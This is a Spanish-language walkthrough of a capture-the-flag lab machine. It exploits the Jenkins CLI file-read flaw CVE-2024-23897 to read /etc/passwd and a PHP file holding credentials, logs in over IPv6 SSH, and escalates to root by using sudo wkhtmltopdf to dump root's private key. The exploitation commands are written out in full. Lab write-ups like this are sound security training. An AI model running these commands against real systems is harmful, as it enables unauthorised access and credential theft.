Hacemos el escaneo de nmap:
![[Pasted image 20240317122039.png]]
Y esto corre por el puerto 80:
![[Pasted image 20240317122123.png]]
Hacemos fuzzing por directorios y extensiones, donde vemos un /connect.php:
```bash
gobuster dir -u http://192.168.0.17/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php,html,sh,py,js
```
![[Pasted image 20240317122249.png]]
Pero no carga nada desde el navegador:
![[Pasted image 20240317122318.png]]
Y por el puerto 8080 visualizamos un jenkins:
![[Pasted image 20240317122450.png]]
Una vez en este punto, utilizamos whatweb para comprobar la versión de Jenkins:
![[Pasted image 20240317122534.png]]
Buscamos vulnerabilidades de esta versión y nos encontramos con lo siguiente:
```bash
https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2024-23897
```
Y en este repositorio nos dicen como explotar un LFI, donde nos dicen que mediante esa ruta nos descargamos un archivo .jar:
![[Pasted image 20240317122802.png]]
Nos lo descargamos poniendo dicha ruta:
```bash
http://192.168.0.17:8080/jnlpJars/jenkins-cli.jar
```
![[Pasted image 20240317122836.png]]
Y se nos dice que con el siguiente comando podemos visualizar archivos internos de la máquina, por ejemplo el /etc/passwd:
![[Pasted image 20240317123016.png]]
Lo ejecutamos:
```bash
java -jar jenkins-cli.jar -s http://192.168.0.17:8080/ -http connect-node "@/etc/passwd"
```
![[Pasted image 20240317123033.png]]
Ahora que podemos leer archivos internos de la máquina, vamos a intentar leer el archivo connect.php de antes que habíamos encontrado haciendo fuzzing:
```bash
java -jar jenkins-cli.jar -s http://192.168.0.17:8080/ -http connect-node "@/var/www/html/connect.php"
```
![[Pasted image 20240317123201.png]]
Tenemos las siguientes credenciales:
```bash
george:g30rg3_L3@k3D
```
Pero estas credenciales no funcionan:
![[Pasted image 20240317123338.png]]
Pero una cosa que podemos comprobar es el archivo if_inet6 en busca de alguna otra interfaz de red que funcione por IPv6:
```bash
java -jar jenkins-cli.jar -s http://192.168.0.17:8080/ -http connect-node "@/proc/net/if_inet6"
```
![[Pasted image 20240317123537.png]]
Estas direcciones se tratan de direcciones de enlace local. Sin embargo, tenemos que convertir esta dirección a notación estándar de IPv6:
```bash
fe80::20c:29ff:fe51:a51f%eth0
```
Hacemos el siguiente escaneo de nmap por IPv6 convirtiendo la IP obtenido de la interfaz ens33:
```bash
sudo nmap -6 -sS -sV -sC --min-rate=5000 -n -Pn fe80::20c:29ff:fe51:a51f%eth0
```
![[Pasted image 20240317124516.png]]
Nos conectamos por ssh y vemos que funciona:
```bash
ssh -6 george@fe80::20c:29ff:fe51:a51f%eth0
```
![[Pasted image 20240317124559.png]]
Ejecutamos el comando sudo -l y vemos una forma de escalar privilegios:
![[Pasted image 20240317124627.png]]
Debemos de enumerar los procesos que se están ejecutando en esta máquina con pspy64:
![[Pasted image 20240317124915.png]]
Y vemos que hay un archivo llamado private.txt:
![[Pasted image 20240317125035.png]]
Con la herramienta wkhtmltopdf vamos a convertirlo en pdf y así obtener dicho archivo:
```bash
sudo -u root /usr/bin/wkhtmltopdf /root/private.txt documento.pdf
```
![[Pasted image 20240317125136.png]]
Nos compartimos este archivo y vemos que se trata de un id_rsa probablemente de root:
![[Pasted image 20240317125224.png]]
Entramos con este id_rsa como root y funciona:
```bash
ssh -6 -i id_rsa root@fe80::20c:29ff:fe51:a51f%eth0
```
![[Pasted image 20240317125403.png]]
